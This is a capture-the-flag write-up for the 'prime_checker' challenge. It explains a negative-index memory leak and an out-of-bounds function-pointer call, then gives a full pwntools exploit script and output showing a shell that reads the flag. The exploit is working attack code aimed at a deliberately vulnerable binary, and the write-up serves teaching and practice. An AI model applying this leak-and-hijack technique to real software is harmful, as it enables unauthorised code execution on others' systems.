# SSD December Challenge (by Juno Im of [theori](https://theori.io) - [@junorouse](https://twitter.com/junorouse))

## Introduction

This program (prime_checker) is a simple binary that tells you if the input value (integer) is a prime number. There are 3 features in the main function,
"Check value Options" that set parameters, "Show results" that show , and "Exit" that you can exit the program.

### Check value Options

```c
int printSubMenu()
{
  puts("1. Make Req");
  puts("2. View Req");
  puts("3. Set Num");
  puts("4. Set Type");
  puts("5. Send Req");
  puts("6. Exit");
  return putchar('>');
}
```

#### Vulnerability A

The following is the code when you choose the "2. View Req" feature:

```c
  int index;
  
  ...
  
    else if ( choice == 2 )
    {
      printf("Index to view: ");
      fgets(&s, 10, stdin);
      index = atoi(&s);
      if ( index >= requestCount )                    [1]
      {
        puts("Invalid Index");
      }
      else
      {
        printf("Req #%d\n", index);
        printf("Number: %lld\n", Numbers[index].value_0);
        printf("Type: %d\n", (LODWORD(Numbers[index].type) | HIDWORD(Numbers[index].type)));
      }
```

The part indicated by [1] does not perform integer overflow checks against index. This allows to induce arbitrary memory leak by accessing with negative index. 

### Show results

The code to show results is as follows:

```c

    if ( result != 2 )
      break;
    printf("Index to view: ");
    fgets(&s, 10, stdin);
    index = atoi(&s);
    if ( index < 0 || index >= inputCount )       [2]
      puts("Invalid index");
    (RequestQueue[index].funcPtr)(index);
  }
```

It gets an element of `RequestQueue` by entered index and call its function pointer

#### Vulnerability B

In [2], the check is also perfomed to ensure that the index is not out-of-bound.
On the other hand, when you entered out of bound index it just prints "Invalid Index" and do nothing.
Therefore, you can call function pointer at arbitrary address((0x18 * index) + 0x8; 0x8 is function pointer offset) through out-of-bound access.

# Exploit

You can leak the PIE/Library base via vulnerability A, however you don't know stack/heap address which stores our input data from fgets / set value feature.
But you can easily figure out that the offset difference between the PIE base and the thread stack is always (90%) same through debugging.

The function which called inside the pthread follows:

```asm
.text:0000000000000F5F ; __unwind {
.text:0000000000000F5F                 push    rbp
.text:0000000000000F60                 mov     rbp, rsp
.text:0000000000000F63                 sub     rsp, 20h
.text:0000000000000F67                 mov     [rbp+var_18], rdi ; our lld input via set value feature
.text:0000000000000F6B                 mov     eax, cs:IfIsLastThenSleep
.text:0000000000000F71                 cmp     eax, 1
.text:0000000000000F74                 jnz     short loc_F8C
.text:0000000000000F76                 lea     rdi, aLetSTakeA2Seco ; "Let's take a 2. second moment of silenc"...
.text:0000000000000F7D                 call    puts
.text:0000000000000F82                 mov     edi, 2          ; seconds
.text:0000000000000F87                 call    sleep
.text:0000000000000F8C
.text:0000000000000F8C loc_F8C:                                ; CODE XREF: calcNoobIsPrime+15↑j
```

- `rbp-var_18 - PIE base` == -695656

## Script

```python
#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'

# r = process(['./ld-2.23.so', './checker'], env={'LD_PRELOAD': './libc-2.23.so ./libpthread-2.23.so'})
while True:
    try:
        r = remote('0', 2324)
        r.sendlineafter('>', '1') # check value options
        # context.log_level = 'debug'

        # vuln A
        # -276 => 0x555555554734; symbol version table
        r.sendlineafter('>', '2') # view req
        r.sendlineafter(':', '-276')
        r.recvuntil('Number: ')
        pie_base = int(r.recvuntil('\n').strip()) - 0x734
        print 'pie_base: 0x%X' % pie_base

        r.sendlineafter('>', '1') # make req
        r.sendlineafter('>', '3') # set number
        r.sendlineafter(':', str(pie_base + 0xf32)) # rip
        r.sendlineafter('>', '4') # set type
        r.sendlineafter(':', '5') # is last | type(1)
        r.sendlineafter('>', '5') # go

        # vuln B
        r.sendlineafter('>', '2')
        r.sendlineafter(':', '-695656') # rbp-var_18 - PIE base
        r.recvuntil('\n')
        r.sendline('id')
        r.recv(4096)

        r.interactive()
        break
    except:
        r.close()
        continue
```


```
➜  binary-2020-12 git:(master) ✗ ./solve.py
pie_base: 0x7FCB120C2000
pie_base: 0x7F34E58B9000
pie_base: 0x7EFC71420000
pie_base: 0x7F4960BE2000
pie_base: 0x7F1DC1750000
pie_base: 0x7F45F7D75000
pie_base: 0x7FD66633E000
pie_base: 0x7F51C09CB000
pie_base: 0x7F430E918000
pie_base: 0x7F16D5D74000
$ ls
checker
flag
helper.sh
launch.sh
ld-2.23.so
libc-2.23.so
libpthread-2.23.so
$ cat flag
S3D{threads_are_so_fun!}
$  
```
